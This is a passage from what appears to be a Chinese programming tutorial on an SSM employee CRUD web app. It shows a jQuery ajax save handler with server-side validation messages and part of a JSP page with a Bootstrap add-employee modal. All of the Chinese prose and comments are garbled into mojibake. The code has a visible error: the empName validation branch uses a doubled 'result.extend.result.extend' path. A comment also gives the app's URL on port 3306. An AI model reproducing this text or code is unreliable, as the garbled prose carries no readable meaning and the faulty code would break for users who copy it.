class="constructor">$(<span class="string">"#empAddModal"</span>)</span>.modal('hide');</span><br><span class="line">                <span class="comment">//2. æ¥åˆ°æœ€åä¸€é¡µï¼Œæ˜¾ç¤ºåˆšæ‰ä¿å­˜çš„æ•°æ®</span></span><br><span class="line">                <span class="comment">//å‘é€ajaxè¯·æ±‚æ˜¾ç¤ºæœ€åä¸€é¡µæ•°æ®å³å¯</span></span><br><span class="line">                <span class="comment">//å¯ä»¥å°†æ€»è®°å½•æ•°å½“ä½œé¡µç </span></span><br><span class="line">                <span class="keyword">to</span><span class="constructor">_page(<span class="params">totalRecords</span>)</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºå¤±è´¥ä¿¡æ¯</span></span><br><span class="line">                <span class="comment">// console.log(result);</span></span><br><span class="line">                <span class="comment">//æœ‰å“ªä¸ªå­—æ®µçš„é”™è¯¯ä¿¡æ¯ï¼Œå°±æ˜¾ç¤ºå“ªä¸ªå­—æ®µ</span></span><br><span class="line">                <span class="keyword">if</span>(undefined != result.extend.errorFields.email)&#123;</span><br><span class="line">                    <span class="comment">//æ˜¾ç¤ºé‚®ç®±é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">                    show<span class="constructor">_validate_msg(<span class="string">"#email_add_input"</span>,<span class="string">"error"</span>,<span class="params">result</span>.<span class="params">extend</span>.<span class="params">errorFields</span>.<span class="params">email</span>)</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(undefined != result.extend.errorFields.empName)&#123;</span><br><span class="line">                    <span class="comment">//æ˜¾ç¤ºå‘˜å·¥é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">                    show<span class="constructor">_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,<span class="params">result</span>.<span class="params">extend</span>.<span class="params">result</span>.<span class="params">extend</span>.<span class="params">errorFields</span>.<span class="params">empName</span>)</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>æ˜¾ç¤ºå³ä½¿æ³¨é‡Šæ‰äº†å‰ç«¯çš„æ ¡éªŒä»£ç ï¼Œä¾ç„¶ä¼šæç¤ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åç«¯çš„æ§åˆ¶å°ä¸­ä¹Ÿä¼šçœ‹åˆ°å¯¹åº”çš„ä¿¡æ¯<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é”™è¯¯çš„å­—æ®µåï¼š<span class="section">email</span></span><br><span class="line">é”™è¯¯ä¿¡æ¯ï¼šé‚®ç®±æ ¼å¼ä¸æ­£ç¡®</span><br></pre></td></tr></table></figure><br>è¿™é‡Œå°±å®Œæˆäº†æœ€ç»ˆçš„æ ¡éªŒ</p><p>å½“ç„¶æ•°æ®åœ¨åˆ›å»ºçš„æ—¶å€™å¯ä»¥ç»™ç”¨æˆ·åå’Œé‚®ç®±ç­‰ä¿¡æ¯æ·»åŠ ä¸å¯é‡å¤çš„ä¾èµ–ï¼Œé‚£å°±åˆæ·»åŠ äº†ä¸€æ¬¡ä¿éšœ</p><p>å½“å‰çš„index.jsp<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- å‘˜å·¥æ·»åŠ çš„æ¨¡æ€æ¡† --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>å‘˜å·¥æ·»åŠ <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> ç”·</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> å¥³</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            éƒ¨é—¨æäº¤éƒ¨é—¨idå³å¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                éƒ¨é—¨åç§°-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>å…³é—­<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_save_btn"</span>&gt;</span>ä¿å­˜<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span 